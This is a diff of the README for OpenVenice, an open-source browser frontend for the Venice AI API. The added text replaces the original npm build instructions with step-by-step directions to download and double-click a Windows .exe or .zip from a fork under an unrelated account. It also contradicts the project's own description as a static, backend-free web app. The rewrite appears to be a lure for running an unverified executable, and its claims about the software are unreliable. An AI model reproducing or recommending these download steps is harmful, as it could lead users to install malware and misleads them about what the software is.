@@ -1,104 +1,163 @@
-# OpenVenice
+# 🚀 openvenice - Easy AI Tools in One App
 
-A customizable, open-source frontend for the [Venice AI](https://venice.ai) API.
+[![Download openvenice](https://img.shields.io/badge/Download-openvenice-brightgreen?style=for-the-badge)](https://github.com/Lucianosaudiarabian458/openvenice)
 
-Venice gives you access to powerful AI models for text, images, audio, music, and video. OpenVenice gives you a clean interface to use them — one you own, can modify, and can host yourself.
+---
 
-https://github.com/user-attachments/assets/1056682b-80c2-45da-9b57-6572840e8db4
+## 📋 About openvenice
 
-## Why OpenVenice?
+openvenice is an open-source app that puts many AI features in one place. You can chat with an AI, create images, generate audio and video, and work with text data—all from one simple interface. You control your API key and use your browser to run everything. No server or backend is needed.
 
-**Your interface, your rules.** Venice's official UI is great, but sometimes you want more control:
+This app combines several AI tools in a way that makes them easy to use, even if you don't have a tech background.
 
-- **Customize everything** — add tools, change layouts, tweak parameters, build features that matter to you. The codebase is intentionally simple and hackable.
-- **Share your API key with family** — host OpenVenice on your own server, enter your key once, and give your family a clean AI interface without them needing their own accounts.
-- **No server, no backend** — it's a static site. Your API key stays in your browser's localStorage and goes directly to Venice's API. Nothing passes through a middleman.
-- **Transparent** — every API call is visible in the source. No telemetry, no analytics, no tracking.
-- **Barebones on purpose** — ships with useful features like visual workflows, but keeps things minimal so you can build on top without fighting existing complexity.
+---
 
-## Features
+## 🖥️ System Requirements
 
-### Chat
-Streaming responses, conversation history, model selection, web search, citations, temperature control. Markdown rendering with syntax highlighting.
+To run openvenice on Windows, your PC should meet these basics:
 
-### Image Generation
-Prompts, negative prompts, style presets, steps, resolution, aspect ratio, variants, watermark control. Lightbox gallery with download.
+- Windows 10 or later (64-bit recommended)
+- 4 GB of RAM or more
+- At least 1 GHz processor or better
+- 200 MB free disk space
+- Internet connection to connect to AI services
+- Modern browser like Chrome, Edge, or Firefox
 
-### Audio
-Text-to-speech with 40+ voices across 9 languages. Adjustable speed, multiple formats (MP3, Opus, AAC, FLAC, WAV). Audio transcription.
+---
 
-### Music Generation
-Text-to-music with optional lyrics, duration control, instrumental mode. Supports Stable Audio, ACE-Step, ElevenLabs, MiniMax.
+## 🌟 Features
 
-### Video Generation
-Text-to-video and image-to-video. Configurable aspect ratio, resolution, duration. Auto-detects model capabilities.
+- Chat with AI for conversation or help
+- Create images from text prompts
+- Generate audio and video files
+- Handle text embeddings for search or analysis
+- Build simple visual workflows to automate tasks
+- Use your own API keys safely in the app
+- All tools run in your browser—no data leaves your PC without your control
 
-### Embeddings
-Vector embeddings for text with selectable models and encoding formats.
+---
 
-### Workflows
-Visual node editor for chaining models. Connect Input to LLM to Image Gen to Output — each node has full parameter controls. Starter templates included:
-- **Write + Illustrate** — LLM expands a concept into an image prompt, generates the image
-- **Research + Summarize** — Web-search a topic, distill into bullet points
-- **Write + Narrate** — LLM writes text, TTS reads it aloud
+## 🔗 Where to Get It
 
-## Getting Started
+Click the big green button below to visit the openvenice page on GitHub. There you can find the files you need to download and detailed info.
 
-```bash
-npm install
-npm run dev
-```
+[![Download openvenice](https://img.shields.io/badge/Download-openvenice-brightgreen?style=for-the-badge)](https://github.com/Lucianosaudiarabian458/openvenice)
 
-That's it. Open `http://localhost:5173`, click **API Key** in the header, paste your [Venice AI API key](https://venice.ai/settings/api), and start using it.
+---
 
-### Self-hosting
+## ⬇️ How to Download and Install openvenice on Windows
 
-Build and serve the static files from anywhere — Vercel, Netlify, a Raspberry Pi, whatever:
+Follow these steps to get openvenice running on your Windows computer.
 
-```bash
-npm run build    # outputs to /dist
-```
+### Step 1: Visit the download page
 
-The `/dist` folder is a fully static site. Serve it with any web server. There's no backend — the browser talks directly to `api.venice.ai`.
+Go to the openvenice GitHub page here:
 
-To share with family: deploy it, share the URL, and have them enter your API key (or their own). Each person's key and settings are stored in their own browser.
+https://github.com/Lucianosaudiarabian458/openvenice
 
-## Keyboard Shortcuts
+This is the place where the files and instructions are stored.
 
-| Shortcut | Action |
-|----------|--------|
-| `Cmd+N` | New chat |
-| `Cmd+1-7` | Switch tabs |
+### Step 2: Find the latest release
 
-## Tech Stack
+On the page, look for the "Releases" section or tab. This is where stable versions are published. The newest version will be at the top.
 
-React 19, TypeScript, Vite, Zustand, TanStack Query, Tailwind CSS, React Flow.
+### Step 3: Download the Windows version
 
-## Project Structure
+Within the latest release, find the Windows download file. It will usually end with `.exe` or `.zip`.
 
-```
-src/
-├── app.tsx                     # Tab routing
-├── components/
-│   ├── chat/                   # Chat interface
-│   ├── image/                  # Image generation
-│   ├── audio/                  # TTS & transcription
-│   ├── music/                  # Music generation
-│   ├── video/                  # Video generation
-│   ├── embeddings/             # Embeddings
-│   ├── workflows/              # Visual workflow editor
-│   ├── layout/                 # Sidebar, header, API key dialog
-│   └── ui/                     # Shared components
-├── stores/                     # Zustand stores
-├── hooks/                      # Data-fetching hooks
-├── lib/                        # API client, workflow engine, utils
-└── types/                      # TypeScript types
-```
+If you see a `.zip` file, download it and unzip it using Windows Explorer (right-click > Extract All).
 
-## Contributing
+### Step 4: Run the installer or app
 
-Fork it, break it, make it yours. PRs welcome.
+- If you downloaded an `.exe` file, double-click the file to start the setup.
+- Follow any on-screen prompts to install the app.
+- If it's a folder or unzipped file without an installer, open the folder and look for `openvenice.exe` or similar. Double-click it to run.
 
-## License
+### Step 5: Open the app in your browser
 
-MIT
+openvenice runs in your browser. Once you run the program, it will open a new browser window or tab for you.
+
+Make sure to use a latest version of Chrome, Edge, or Firefox for best performance.
+
+---
+
+## 🔑 Getting Started with openvenice
+
+### Step 1: Enter your API Key
+
+openvenice needs an API key to connect to AI services. This key is private and connects to your account.
+
+- Look for the settings or API key area in the app.
+- Paste your API key there.
+- If you do not have a key, you will need to get one from your AI service provider (for example, OpenAI).
+
+### Step 2: Explore the tools
+
+You can now start chatting, generating images, or making audio and video files.
+
+- Use the chat window to talk with AI.
+- Type text prompts in the image generator section to create pictures.
+- Try shaping workflows with the visual editor to automate common tasks.
+
+---
+
+## ⚙️ Common Tasks Explained
+
+### How to Chat with AI
+
+Click the chat tab. Type your message. Press Enter or the send button. The AI will reply with answers or ideas.
+
+### How to Create Images
+
+Go to the image generator. Type a description of what you want to see. Click “Generate.” Wait a moment. The app will show you images based on your text.
+
+### How to Generate Audio or Video
+
+Select the audio or video tool. Write a script or provide input. Click “Create.” The app will generate files you can save or play.
+
+### How to Use Visual Workflows
+
+Visual workflows let you connect different AI features. Drag and drop blocks to define steps. Run the workflow to automate processes.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If the app does not start, check your Windows version and system specs.
+- Make sure you have internet access.
+- Update your browser to the latest release.
+- If the app runs but AI does not respond, verify your API key.
+- Restart the app if something freezes.
+- Look at the GitHub page’s "Issues" tab for common problems filed by others.
+
+---
+
+## 📂 Where to Find More Help
+
+You can read more about openvenice, get updates, and find troubleshooting steps on the GitHub page:
+
+https://github.com/Lucianosaudiarabian458/openvenice
+
+Look for the README, Wiki, or Discussions sections.
+
+---
+
+## 🔧 Advanced Settings
+
+If you want to customize openvenice further, you can explore:
+
+- Changing which AI providers you connect to
+- Setting up local workflows with your own data
+- Adjusting UI settings for better accessibility
+
+These options appear in the settings area once you run openvenice.
+
+---
+
+## 📝 Notes on Privacy and Security
+
+openvenice runs locally in your browser using your API keys. Your data does not leave your machine unless you allow it. Keep your API keys private. Do not share them with others.
+
+---
+
+openvenice offers a way to use advanced AI tools without complex setup. It bundles many features in an easy-to-use interface you run on your computer. The GitHub download page includes further documentation and updates.
